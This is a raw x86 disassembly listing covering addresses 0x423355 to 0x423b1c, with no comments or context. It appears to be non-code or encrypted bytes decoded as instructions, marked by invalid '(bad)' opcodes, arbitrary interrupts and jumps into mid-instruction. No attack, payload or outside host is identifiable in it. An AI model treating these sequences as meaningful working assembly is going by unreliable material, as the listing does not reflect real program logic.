  423355:	mov    ch,0xcd
  423357:	xchg   esi,eax
  423358:	mov    ch,0x3b
  42335a:	or     al,0x3b
  42335c:	cdq    
  42335d:	shr    ebx,cl
  42335f:	xchg   edx,eax
  423360:	shr    edx,cl
  423362:	sub    BYTE PTR [ebx+0x13],dl
  423365:	push   ecx
  423366:	mov    ch,cl
  423368:	jbe    0x423363
  42336a:	int    0x8d
  42336c:	stc    
  42336d:	cmp    eax,ebp
  42336f:	cmp    ecx,DWORD PTR [edi]
  423371:	shl    edx,cl
  423373:	sub    bl,dl
  423375:	mov    ebp,0xcdd35392
  42337a:	lea    esi,[ebp+0x43]
  42337d:	shr    DWORD PTR [edi],cl
  42337f:	add    eax,0x80805300
  423384:	int    0x76
  423386:	stc    
  423387:	int    0x8d
  423389:	stc    
  42338a:	cmp    eax,ebp
  42338c:	cmp    ecx,DWORD PTR [edi]
  42338e:	shl    edx,cl
  423390:	sub    bl,dl
  423392:	mov    ebp,0xcdd35392
  423397:	(bad)  
  423398:	std    
  423399:	inc    ebx
  42339a:	shr    DWORD PTR [edi],cl
  42339c:	add    eax,0x808053ea
  4233a1:	int    0x76
  4233a3:	stc    
  4233a4:	int    0x8d
  4233a6:	stc    
  4233a7:	cmp    eax,ebp
  4233a9:	cmp    ecx,DWORD PTR [edi]
  4233ab:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233b1:	push   ebx
  4233b2:	shr    esp,cl
  4233b4:	adc    al,0xcd
  4233b6:	lea    esi,[ebp+0x3bb596cd]
  4233bc:	or     al,0x3b
  4233be:	cdq    
  4233bf:	shr    ebx,cl
  4233c1:	xchg   edx,eax
  4233c2:	shr    edx,cl
  4233c4:	sub    BYTE PTR [ebx+0x13],dl
  4233c7:	xchg   ebx,edx
  4233c9:	int    0x8d
  4233cb:	std    
  4233cc:	inc    ebx
  4233cd:	rol    DWORD PTR [edx-0x2893219],cl
  4233d3:	or     dh,BYTE PTR [esi-0x53]
  4233d6:	int    0x76
  4233d8:	jne    0x4233e4
  4233da:	jbe    0x4233ac
  4233dc:	ret    
  4233dd:	dec    ecx
  4233de:	and    DWORD PTR [esi+0x45e60a35],eax
  4233e4:	leave  
  4233e5:	jbe    0x423384
  4233e7:	inc    ecx
  4233e8:	and    DWORD PTR [esi+0x4576cd35],eax
  4233ee:	int    0x8d
  4233f0:	inc    ebp
  4233f1:	cmp    eax,ebp
  4233f3:	cmp    ecx,DWORD PTR [edi]
  4233f5:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233fb:	push   ebx
  4233fc:	ror    DWORD PTR [edx],cl
  4233fe:	jbe    0x423455
  423400:	int    0x76
  423402:	inc    ebp
  423403:	int    0x8d
  423405:	inc    ebp
  423406:	cmp    eax,ebp
  423408:	cmp    ecx,DWORD PTR [edi]
  42340a:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423410:	push   ebx
  423411:	ror    DWORD PTR [edx],cl
  423413:	jbe    0x4233aa
  423415:	leave  
  423416:	jbe    0x423455
  423418:	dec    eax
  423419:	and    DWORD PTR [esi+0x1d76c935],eax
  42341f:	ret    0x8621
  423422:	xor    eax,0xcd4576cd
  423427:	lea    eax,[ebp+0x3b]
  42342a:	lds    edi,FWORD PTR [ebx]
  42342c:	psrlq  mm6,mm2
  42342f:	sub    bl,dl
  423431:	mov    ebp,0xcdd35392
  423436:	lea    ebp,[ebp+0x52f7d43]
  42343c:	push   ss
  42343d:	xchg   DWORD PTR [eax-0x6d241480],eax
  423443:	add    BYTE PTR [eax-0x32c27233],0x76
  42344a:	cmp    eax,0x3b5596cd
  42344f:	jns    0x42348c
  423451:	or     al,0xd3
  423453:	lods   eax,DWORD PTR ds:[esi]
  423454:	sub    bl,dl
  423456:	jmp    0x4233ea
  423458:	push   ebx
  423459:	jge    0x423428
  42345b:	jbe    0x42340a
  42345d:	xor    edx,edx
  42345f:	cmp    ebx,edx
  423461:	clc    
  423462:	add    cl,BYTE PTR [edx]
  423464:	jbe    0x4233fb
  423466:	int    0x76
  423468:	sbb    eax,0x3b1d8dcd
  42346d:	lds    edi,FWORD PTR [ebx]
  42346f:	psrlq  mm6,mm2
  423472:	sub    bl,dl
  423474:	mov    ebp,0xcdd35392
  423479:	lea    edx,[ebp+0x16d87d43]
  42347f:	int    0x76
  423481:	sbb    eax,0x3b1d8dcd
  423486:	lds    edi,FWORD PTR [ebx]
  423488:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42348f:	push   ebx
  423490:	ror    DWORD PTR [edx],cl
  423492:	jbe    0x423429
  423494:	int    0x76
  423496:	cmp    eax,0x3b3d8dcd
  42349b:	lds    edi,FWORD PTR [ebx]
  42349d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  4234a4:	push   ebx
  4234a5:	ror    ebp,cl
  4234a7:	lea    edx,[ebp+0xad3d12f]
  4234ad:	jbe    0x423444
  4234af:	int    0x76
  4234b1:	inc    ebp
  4234b2:	int    0x8d
  4234b4:	inc    ebp
  4234b5:	cmp    eax,ebp
  4234b7:	cmp    ecx,DWORD PTR [edi]
  4234b9:	shl    edx,cl
  4234bb:	sub    bl,dl
  4234bd:	mov    ebp,0xcdd35392
  4234c2:	lea    edx,[ebp+0x52f7d43]
  4234c8:	pusha  
  4234c9:	xchg   edx,eax
  4234ca:	add    BYTE PTR [eax+0xa9576cd],0x76
  4234d1:	or     eax,0x875576cd
  4234d6:	jbe    0x4234a8
  4234d8:	or     ah,dh
  4234da:	xchg   ebp,eax
  4234db:	or     dh,BYTE PTR [esi+0x6d]
  4234de:	pop    ebp
  4234df:	inc    ecx
  4234e0:	and    DWORD PTR [esi+0x5d760a35],eax
  4234e6:	leave  
  4234e7:	jbe    0x4234fe
  4234e9:	cmp    DWORD PTR [ecx],esp
  4234eb:	xchg   BYTE PTR ds:0xb23576c9,dh
  4234f1:	and    DWORD PTR [esi-0xe89f5cb],eax
  4234f7:	int    0x76
  4234f9:	xchg   ebp,eax
  4234fa:	int    0x8d
  4234fc:	xchg   ebp,eax
  4234fd:	cmp    eax,ebp
  4234ff:	cmp    ecx,DWORD PTR [edi]
  423501:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423507:	push   ebx
  423508:	ror    DWORD PTR [edx],cl
  42350a:	jbe    0x423589
  42350c:	int    0x6d
  42350e:	jmp    0x423516
  423510:	add    DWORD PTR [eax-0x36923280],0x7006
  42351a:	add    BYTE PTR [ebx],cl
  42351c:	and    DWORD PTR [esi-0x369232cb],eax
  423522:	push   es
  423523:	xchg   esp,eax
  423524:	add    BYTE PTR [eax],al
  423526:	add    bh,dh
  423528:	and    DWORD PTR [esi-0x329232cb],eax
  42352e:	ins    DWORD PTR es:[edi],dx
  42352f:	int    0x76
  423531:	icebp  
  423532:	int    0x8d
  423534:	icebp  
  423535:	cmp    eax,ebp
  423537:	cmp    ecx,DWORD PTR [edi]
  423539:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42353f:	push   ebx
  423540:	ror    ebp,cl
  423542:	lea    edi,[ebp+0x2f]
  423545:	rcl    ebx,1
  423547:	int    0x8d
  423549:	ins    DWORD PTR es:[edi],dx
  42354a:	retf   0x8884
  42354d:	or     DWORD PTR [esi-0x57],esi
  423550:	int    0x6d
  423552:	int    0x76
  423554:	icebp  
  423555:	int    0x8d
  423557:	icebp  
  423558:	cmp    ecx,DWORD PTR [edi]
  42355a:	cmp    eax,ebp
  42355c:	shl    edx,cl
  42355e:	sub    bl,dl
  423560:	mov    ebp,0xcdd35392
  423565:	lea    edi,[ebp+0x2f]
  423568:	rcl    ebx,1
  42356a:	int    0x8d
  42356c:	adc    eax,0x3b1596cd
  423571:	or     al,0x3b
  423573:	cdq    
  423574:	shr    ebx,cl
  423576:	xchg   edx,eax
  423577:	shr    edx,cl
  423579:	sub    BYTE PTR [ebx+0x13],dl
  42357c:	xchg   ebx,edx
  42357e:	int    0x8d
  423580:	ins    DWORD PTR es:[edi],dx
  423581:	das    
  423582:	pop    ecx
  423583:	dec    esp
  423584:	mov    ch,cl
  423586:	push   es
  423587:	jo     0x423589
  423589:	add    BYTE PTR [eax],al
  42358b:	int    0x17
  42358d:	jo     0x42358f
  42358f:	add    BYTE PTR [eax],al
  423591:	cmp    eax,ebp
  423593:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423599:	jmp    0x2fd3:0x87d25328
  4235a0:	pop    ecx
  4235a1:	lea    ebp,[ecx-0x72f682c5]
  4235a7:	test   eax,0x76ca6dcd
  4235ac:	test   eax,0xcdf18dcd
  4235b1:	xchg   esi,eax
  4235b2:	icebp  
  4235b3:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235b6:	cdq    
  4235b7:	shr    edx,cl
  4235b9:	sub    bl,dl
  4235bb:	jmp    0x42354f
  4235bd:	push   ebx
  4235be:	adc    ecx,ebp
  4235c0:	xchg   esi,eax
  4235c1:	jge    0x4235f2
  4235c3:	rcl    DWORD PTR [ebx],1
  4235c5:	int    0x96
  4235c7:	ins    DWORD PTR es:[edi],dx
  4235c8:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235cf:	icebp  
  4235d0:	int    0x8d
  4235d2:	icebp  
  4235d3:	cmp    eax,ebp
  4235d5:	cmp    ecx,DWORD PTR [edi]
  4235d7:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4235dd:	push   ebx
  4235de:	ror    ebp,cl
  4235e0:	lea    edi,[ebp+0x2f]
  4235e3:	rcl    ebx,1
  4235e5:	int    0x8d
  4235e7:	ins    DWORD PTR es:[edi],dx
  4235e8:	retf   0x8884
  4235eb:	or     DWORD PTR [esi-0x57],esi
  4235ee:	int    0x6d
  4235f0:	int    0x76
  4235f2:	icebp  
  4235f3:	int    0x8d
  4235f5:	icebp  
  4235f6:	cmp    eax,ebp
  4235f8:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4235fe:	repnz sub BYTE PTR [ebx-0x2d],dl
  423602:	int    0x8d
  423604:	jge    0x423635
  423606:	rcl    ebx,1
  423608:	int    0x8d
  42360a:	pop    ebp
  42360b:	int    0x96
  42360d:	pop    ebp
  42360e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423611:	cdq    
  423612:	shr    ebx,cl
  423614:	xchg   edx,eax
  423615:	shr    edx,cl
  423617:	sub    BYTE PTR [ebx+0x13],dl
  42361a:	xchg   ebx,edx
  42361c:	int    0x8d
  42361e:	ins    DWORD PTR es:[edi],dx
  42361f:	das    
  423620:	pop    ecx
  423621:	dec    esp
  423622:	mov    ch,cl
  423624:	push   es
  423625:	xchg   esp,eax
  423626:	add    BYTE PTR [eax],al
  423628:	add    ch,cl
  42362a:	pop    ss
  42362b:	xchg   esp,eax
  42362c:	add    BYTE PTR [eax],al
  42362e:	add    BYTE PTR [ebx],bh
  423630:	lds    edi,FWORD PTR [ebx]
  423632:	cdq    
  423633:	sar    DWORD PTR [ebp+0x28ead392],cl
  423639:	push   ebx
  42363a:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423640:	test   eax,0x8d097d3b
  423645:	test   eax,0x76ca6dcd
  42364a:	test   eax,0xcdf18dcd
  42364f:	xchg   esi,eax
  423650:	icebp  
  423651:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423654:	cdq    
  423655:	shr    edx,cl
  423657:	sub    bl,dl
  423659:	jmp    0x4235ed
  42365b:	push   ebx
  42365c:	adc    ecx,ebp
  42365e:	xchg   esi,eax
  42365f:	jge    0x423690
  423661:	rcl    DWORD PTR [ebx],1
  423663:	int    0x96
  423665:	ins    DWORD PTR es:[edi],dx
  423666:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42366d:	xor    eax,0x3b358dcd
  423672:	(bad)  
  423674:	(bad)
  423677:	sub    bl,dl
  423679:	mov    ebp,0xcdd35392
  42367e:	lea    ebx,[ebp-0x33]
  423681:	xchg   esi,eax
  423682:	pop    ebp
  423683:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423686:	cdq    
  423687:	shr    ebx,cl
  423689:	xchg   edx,eax
  42368a:	shr    edx,cl
  42368c:	sub    BYTE PTR [ebx+0x13],dl
  42368f:	das    
  423690:	rcl    ebx,1
  423692:	xchg   DWORD PTR [esi+0x7d],esi
  423695:	or     dh,BYTE PTR [esi+0x7d]
  423698:	int    0x76
  42369a:	jge    0x423669
  42369c:	lea    ecx,ds:0xb2f7d43
  4236a2:	(bad)  
  4236a3:	inc    DWORD PTR [eax]
  4236a5:	add    ch,cl
  4236a7:	jbe    0x423706
  4236a9:	int    0x8d
  4236ab:	pop    ebp
  4236ac:	cmp    ecx,DWORD PTR [edi]
  4236ae:	shl    edx,cl
  4236b0:	sub    BYTE PTR [ebx],bh
  4236b2:	(bad)
  4236b5:	xchg   edx,eax
  4236b6:	push   ebx
  4236b7:	ror    ebp,cl
  4236b9:	lea    ecx,ds:0xcdd3d12f
  4236bf:	lea    edx,[ebp-0x142cf3c5]
  4236c5:	xchg   edx,eax
  4236c6:	push   ebx
  4236c7:	ror    ebp,cl
  4236c9:	lea    edx,[ebp-0xd2cf0c5]
  4236cf:	sub    BYTE PTR [ebx-0x2d],dl
  4236d2:	or     dh,BYTE PTR [esi+0x35]
  4236d5:	int    0x76
  4236d7:	popf   
  4236d8:	int    0x8d
  4236da:	popf   
  4236db:	cmp    ecx,DWORD PTR [edi]
  4236dd:	shl    edx,cl
  4236df:	sub    BYTE PTR [ebx],bh
  4236e1:	(bad)
  4236e4:	xchg   edx,eax
  4236e5:	push   ebx
  4236e6:	ror    ebp,cl
  4236e8:	lea    ebx,[ebp+0x3b9d96cd]
  4236ee:	or     al,0xd3
  4236f0:	jmp    0x423684
  4236f2:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4236f8:	adc    eax,DWORD PTR [edi+0x7d87358d]
  4236fe:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  423704:	in     al,dx
  423705:	sbb    al,0xcd
  423707:	jbe    0x4236a6
  423709:	int    0x8d
  42370b:	popf   
  42370c:	cmp    eax,ebp
  42370e:	cmp    ecx,DWORD PTR [edi]
  423710:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423716:	push   ebx
  423717:	rol    DWORD PTR [edi+0x760a5576],cl
  42371d:	push   ebp
  42371e:	int    0x76
  423720:	popf   
  423721:	int    0x8d
  423723:	popf   
  423724:	cmp    eax,ebp
  423726:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42372c:	repnz sub BYTE PTR [ebx-0x2d],dl
  423730:	int    0x8d
  423732:	lods   eax,DWORD PTR ds:[esi]
  423733:	xor    edi,DWORD PTR [ebp-0x33]
  423736:	jbe    0x4236d5
  423738:	int    0x96
  42373a:	popf   
  42373b:	cmp    eax,ebp
  42373d:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  423743:	mov    ebp,0xcdd25392
  423748:	xchg   esi,eax
  423749:	push   ebp
  42374a:	das    
  42374b:	rcl    edx,1
  42374d:	inc    ebx
  42374e:	shr    DWORD PTR [edi],cl
  423750:	pop    es
  423751:	adc    ebp,edi
  423753:	add    BYTE PTR [eax],al
  423755:	int    0x76
  423757:	stc    
  423758:	int    0x76
  42375a:	stc    
  42375b:	int    0x76
  42375d:	std    
  42375e:	or     dh,BYTE PTR [esi+0x35]
  423761:	int    0x76
  423763:	mov    ch,cl
  423765:	lea    esp,ds:0x3b2596cd
  42376b:	or     al,0xd3
  42376d:	jmp    0x423701
  42376f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423775:	add    BYTE PTR [eax+0x5328ead3],0x13
  42377c:	jno    0x42374b
  42377e:	lea    esp,[ebp-0x33]
  423781:	xchg   esi,eax
  423782:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423786:	cdq    
  423787:	shr    ebx,cl
  423789:	xchg   edx,eax
  42378a:	shr    edx,cl
  42378c:	sub    BYTE PTR [ebx+0x13],dl
  42378f:	jno    0x42375e
  423791:	(bad)  
  423792:	stc    
  423793:	int    0x96
  423795:	stc    
  423796:	add    dh,dl
  423798:	xor    eax,0x993b0c3b
  42379d:	shr    ebx,cl
  42379f:	xchg   edx,eax
  4237a0:	shr    edx,cl
  4237a2:	sub    BYTE PTR [ebx+0x13],dl
  4237a5:	jno    0x4237a7
  4237a7:	jo     0x4237bd
  4237a9:	int    0x8d
  4237ab:	stc    
  4237ac:	int    0x96
  4237ae:	stc    
  4237af:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237b2:	cdq    
  4237b3:	shr    ebx,cl
  4237b5:	xchg   edx,eax
  4237b6:	shr    edx,cl
  4237b8:	sub    BYTE PTR [ebx+0x13],dl
  4237bb:	or     dh,BYTE PTR [esi+0x65]
  4237be:	inc    ebx
  4237bf:	jge    0x4237f0
  4237c1:	add    eax,0x808080ab
  4237c6:	int    0x76
  4237c8:	stc    
  4237c9:	in     al,dx
  4237ca:	(bad)  
  4237cb:	int    0x96
  4237cd:	or     dh,BYTE PTR gs:[esi-0x53]
  4237d1:	push   ecx
  4237d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237d3:	lods   eax,DWORD PTR ds:[esi]
  4237d4:	int    0x8d
  4237d6:	lods   eax,DWORD PTR ds:[esi]
  4237d7:	shr    ebx,cl
  4237d9:	xchg   edx,eax
  4237da:	cmp    edi,DWORD PTR [ecx-0x2d]
  4237dd:	lods   eax,DWORD PTR ds:[esi]
  4237de:	sub    BYTE PTR [ebx-0x2d],dl
  4237e1:	int    0x8d
  4237e3:	jne    0x4237af
  4237e5:	dec    esp
  4237e6:	or     DWORD PTR [ecx],0x8dcd304c
  4237ec:	mov    ch,0xcd
  4237ee:	lea    esi,[ebp+0x3bb596cd]
  4237f4:	or     al,0x3b
  4237f6:	cdq    
  4237f7:	shr    edx,cl
  4237f9:	sub    bl,dl
  4237fb:	jmp    0x42378f
  4237fd:	push   ebx
  4237fe:	adc    ecx,ebp
  423800:	xchg   esi,eax
  423801:	mov    ch,0x87
  423803:	jge    0x4237d2
  423805:	jbe    0x4237b4
  423807:	cmp    edx,ebp
  423809:	add    al,0xad
  42380b:	std    
  42380c:	add    al,0xea
  42380e:	std    
  42380f:	shr    ebx,cl
  423811:	sub    BYTE PTR [edi+0x3bd353d2],al
  423817:	leave  
  423818:	int    0x8d
  42381a:	std    
  42381b:	int    0x96
  42381d:	std    
  42381e:	shr    edx,cl
  423820:	xchg   edx,eax
  423821:	shr    ebx,cl
  423823:	sub    BYTE PTR [ebx-0x1d],dl
  423826:	cmp    ebx,ecx
  423828:	inc    ebx
  423829:	rcl    dh,cl
  42382b:	mov    ds:0xcd8876cd,eax
  423830:	lea    ebp,ds:0xcd2d96cd
  423836:	add    DWORD PTR [ecx],edx
  423838:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423842:	shr    edx,cl
  423844:	sub    BYTE PTR [ebx+0x13],dl
  423847:	jno    0x423816
  423849:	(bad)  
  42384a:	stc    
  42384b:	int    0x96
  42384d:	stc    
  42384e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423851:	cdq    
  423852:	shr    ebx,cl
  423854:	xchg   edx,eax
  423855:	shr    edx,cl
  423857:	sub    BYTE PTR [ebx+0x13],dl
  42385a:	jno    0x42385c
  42385c:	(bad)  
  42385d:	jne    0x42385f
  42385f:	jo     0x42387d
  423861:	int    0x76
  423863:	or     dh,BYTE PTR gs:[esi+0x75]
  423867:	int    0x76
  423869:	xor    eax,0xcdfd760a
  42386e:	jbe    0x42386d
  423870:	cmp    ecx,ebx
  423872:	add    al,0xbd
  423874:	test   ah,dl
  423876:	xor    ecx,ebp
  423878:	jbe    0x4238ef
  42387a:	int    0x14
  42387c:	mov    ch,cl
  42387e:	jbe    0x4238f5
  423880:	int    0x84
  423882:	mov    BYTE PTR [ebx],bh
  423884:	jns    0x4238c1
  423886:	aad    0xd3
  423888:	lods   eax,DWORD PTR ds:[esi]
  423889:	sub    bl,dl
  42388b:	repz xchg edx,eax
  42388d:	push   ebx
  42388e:	ror    ch,cl
  423890:	xchg   esi,eax
  423891:	jne    0x42389d
  423893:	test   BYTE PTR [edx-0x33],cl
  423896:	jbe    0x423895
  423898:	add    al,0xd3
  42389a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  4238a1:	xlat   BYTE PTR ds:[ebx]
  4238a2:	int    0x76
  4238a4:	std    
  4238a5:	cmp    ecx,ebx
  4238a7:	add    al,0xbd
  4238a9:	test   ah,dl
  4238ab:	xor    ecx,ebp
  4238ad:	jbe    0x423924
  4238af:	int    0x14
  4238b1:	mov    ch,cl
  4238b3:	jbe    0x42392a
  4238b5:	int    0x84
  4238b7:	mov    BYTE PTR [ebx],bh
  4238b9:	jns    0x4238f6
  4238bb:	aad    0xd3
  4238bd:	lods   eax,DWORD PTR ds:[esi]
  4238be:	sub    bl,dl
  4238c0:	repz xchg edx,eax
  4238c2:	push   ebx
  4238c3:	ror    ch,cl
  4238c5:	xchg   esi,eax
  4238c6:	jne    0x4238d2
  4238c8:	test   BYTE PTR [edx-0x33],cl
  4238cb:	jbe    0x4238ca
  4238cd:	add    al,0xd3
  4238cf:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  4238d6:	xlat   BYTE PTR ds:[ebx]
  4238d7:	int    0x76
  4238d9:	jne    0x4238e5
  4238db:	jbe    0x4238ea
  4238dd:	int    0x76
  4238df:	mov    ch,0xcd
  4238e1:	lea    esi,[ebp+0xf3bc53b]
  4238e7:	shl    edx,cl
  4238e9:	sub    bl,dl
  4238eb:	mov    ebp,0xcdd35392
  4238f0:	(bad)  
  4238f1:	stc    
  4238f2:	or     dh,BYTE PTR [esi+0x25]
  4238f5:	leave  
  4238f6:	jbe    0x4238c4
  4238f8:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  4238ff:	imul   edx,ebp,0x8d0a0c69
  423905:	gs adc bh,dl
  423908:	into   
  423909:	and    DWORD PTR [esi-0x32fad0cb],eax
  42390f:	add    BYTE PTR [eax+0xd96cd80],0xcd
  423916:	sar    DWORD PTR [ebx],cl
  423918:	lds    ecx,FWORD PTR [edx]
  42391a:	jbe    0x4238c9
  42391c:	rol    esi,cl
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	xchg   edx,eax
  423920:	or     dh,BYTE PTR [esi-0x30]
  423923:	int    0xd3
  423925:	cmp    edi,DWORD PTR [ecx-0x2d]
  423928:	lods   eax,DWORD PTR ds:[esi]
  423929:	sub    BYTE PTR [ebx+0x76],dl
  42392c:	lods   eax,DWORD PTR ds:[esi]
  42392d:	retf   0x858c
  423930:	int3   
  423931:	das    
  423932:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  42393d:	retf   
  42393e:	inc    ebx
  42393f:	rcl    esi,cl
  423941:	jle    0x423910
  423943:	jbe    0x4238fa
  423945:	int    0x8d
  423947:	mov    ch,0xcd
  423949:	jbe    0x423900
  42394b:	int    0x96
  42394d:	mov    ch,0x3b
  42394f:	jns    0x42398c
  423951:	or     al,0xd3
  423953:	lods   eax,DWORD PTR ds:[esi]
  423954:	sub    bl,dl
  423956:	jmp    0x4238ea
  423958:	push   ebx
  423959:	jge    0x423928
  42395b:	jbe    0x4239c2
  42395d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423960:	lods   eax,DWORD PTR ds:[esi]
  423961:	sub    BYTE PTR [ebx+0x76],dl
  423964:	lods   eax,DWORD PTR ds:[esi]
  423965:	cmp    edx,ebp
  423967:	xchg   DWORD PTR [ebp-0x33],edi
  42396a:	jbe    0x42393c
  42396c:	add    al,0xea
  42396e:	std    
  42396f:	add    al,0xad
  423971:	std    
  423972:	shr    ebx,cl
  423974:	sub    BYTE PTR [edi+0x3b1353f1],al
  42397a:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423981:	and    DWORD PTR [esi-0x323329cb],eax
  423987:	jbe    0x4239ae
  423989:	in     al,dx
  42398a:	and    cl,ch
  42398c:	jbe    0x423987
  42398e:	int    0x8d
  423990:	stc    
  423991:	cmp    eax,ebp
  423993:	cmp    ecx,DWORD PTR [edi]
  423995:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42399b:	push   ebx
  42399c:	ror    ebp,cl
  42399e:	(bad)  
  42399f:	stc    
  4239a0:	int    0x96
  4239a2:	stc    
  4239a3:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4239a6:	cdq    
  4239a7:	shr    ebx,cl
  4239a9:	xchg   edx,eax
  4239aa:	shr    edx,cl
  4239ac:	sub    BYTE PTR [ebx+0x13],dl
  4239af:	inc    ebx
  4239b0:	jge    0x4239e1
  4239b2:	add    eax,0x80809223
  4239b7:	int    0x76
  4239b9:	or     eax,0xa886ccd
  4239be:	out    0xb5,al
  4239c0:	leave  
  4239c1:	jbe    0x4239e8
  4239c3:	mov    dl,0x21
  4239c5:	xchg   BYTE PTR ds:0x393576c9,dh
  4239cb:	and    DWORD PTR [esi-0x6a8936cb],eax
  4239d1:	dec    ecx
  4239d2:	mov    al,ds:0x76c93586
  4239d7:	lods   eax,DWORD PTR ds:[esi]
  4239d8:	imul   esp,DWORD PTR [ecx],0x76c93586
  4239de:	and    ch,BYTE PTR gs:[ebx-0x7a]
  4239e2:	xor    eax,0xcd3d760a
  4239e7:	jbe    0x423971
  4239e9:	int    0x8d
  4239eb:	lods   eax,DWORD PTR ds:[esi]
  4239ec:	int    0x96
  4239ee:	lods   eax,DWORD PTR ds:[esi]
  4239ef:	cmp    ecx,DWORD PTR [ebx+edx*8]
  4239f2:	jmp    0x423986
  4239f4:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4239fa:	adc    esi,DWORD PTR [ecx-0x33]
  4239fd:	lea    edx,[ebp+0x3b9596cd]
  423a03:	or     al,0xd3
  423a05:	jmp    0x423999
  423a07:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423a0d:	add    BYTE PTR [eax+0x5328ead3],0x13
  423a14:	jno    0x4239e3
  423a16:	lea    esp,[ebp-0x33]
  423a19:	xchg   esi,eax
  423a1a:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423a1e:	cdq    
  423a1f:	shr    ebx,cl
  423a21:	xchg   edx,eax
  423a22:	shr    edx,cl
  423a24:	sub    BYTE PTR [ebx+0x13],dl
  423a27:	jno    0x4239f6
  423a29:	lea    esi,[ebp+0x3bb596cd]
  423a2f:	or     al,0x3b
  423a31:	cdq    
  423a32:	shr    ebx,cl
  423a34:	xchg   edx,eax
  423a35:	shr    edx,cl
  423a37:	sub    BYTE PTR [ebx+0x13],dl
  423a3a:	jno    0x423a3c
  423a3c:	jo     0x423a52
  423a3e:	or     dh,BYTE PTR [esi+0x65]
  423a41:	int    0x76
  423a43:	mov    ch,cl
  423a45:	lea    ebp,[ebp+0x3bad96cd]
  423a4b:	or     al,0xd3
  423a4d:	jmp    0x4239e1
  423a4f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423a55:	add    BYTE PTR [eax+0x5328ead3],0x13
  423a5c:	jno    0x423a2b
  423a5e:	lea    edx,[ebp+0x3b9596cd]
  423a64:	or     al,0x3b
  423a66:	cdq    
  423a67:	shr    ebx,cl
  423a69:	xchg   edx,eax
  423a6a:	shr    edx,cl
  423a6c:	sub    BYTE PTR [ebx+0x13],dl
  423a6f:	jno    0x423a3e
  423a71:	lea    esi,[ebp+0xb596cd]
  423a77:	(bad)  
  423a78:	cmp    eax,0x993b0c3b
  423a7d:	shr    ebx,cl
  423a7f:	xchg   edx,eax
  423a80:	shr    edx,cl
  423a82:	sub    BYTE PTR [ebx+0x13],dl
  423a85:	jno    0x423a87
  423a87:	jo     0x423a9d
  423a89:	int    0x8d
  423a8b:	mov    ch,0xa
  423a8d:	jbe    0x423a3c
  423a8f:	int    0x76
  423a91:	mov    ch,0x3b
  423a93:	or     al,0x3b
  423a95:	jns    0x423a6a
  423a97:	jmp    0x423a2b
  423a99:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a9f:	jbe    0x423b06
  423aa1:	inc    ebx
  423aa2:	jge    0x423ad3
  423aa4:	add    eax,0x8080853c
  423aa9:	int    0x8d
  423aab:	mov    ch,0xcd
  423aad:	xchg   esi,eax
  423aae:	mov    ch,0x3b
  423ab0:	or     al,0x3b
  423ab2:	cdq    
  423ab3:	shr    ebx,cl
  423ab5:	xchg   edx,eax
  423ab6:	shr    edx,cl
  423ab8:	sub    BYTE PTR [ebx+0x13],dl
  423abb:	inc    ebx
  423abc:	lea    ebp,[ebp-0x7ab2fad1]
  423ac2:	add    BYTE PTR [eax-0x32da7233],0x8d
  423ac9:	and    eax,0x192ebd3
  423ace:	add    ch,BYTE PTR [edi-0x723277f7]
  423ad4:	mov    ch,0xcd
  423ad6:	lea    esi,[ebp+0x192ebd3]
  423adc:	add    ch,BYTE PTR [edi-0x327e83f7]
  423ae2:	lea    esi,ds:0xd3358dcd
  423ae8:	jmp    0x423a7c
  423aea:	add    DWORD PTR [edx],eax
  423aec:	scas   eax,DWORD PTR es:[edi]
  423aed:	or     DWORD PTR [edx+edx*4+0x4],edi
  423af1:	aaa    
  423af2:	sbb    al,0x0
  423af4:	add    BYTE PTR [eax],al
  423af6:	add    BYTE PTR [edi+esi*1],0x24
  423afa:	add    BYTE PTR [eax],al
  423afc:	add    BYTE PTR [eax+0x24cfcf],al
  423b02:	add    BYTE PTR [eax],al
  423b04:	jno    0x423b06
  423b06:	(bad)  
  423b07:	cmp    eax,0x1ccfcf
  423b0c:	add    BYTE PTR [eax],al
  423b0e:	add    dh,dl
  423b10:	lods   eax,DWORD PTR ds:[esi]
  423b11:	jno    0x423ae0
  423b13:	lea    ecx,ds:0xcd4c9100
  423b19:	lea    esi,[ebp+0x4]
  423b1c:	shl    DWORD PTR [eax],cl
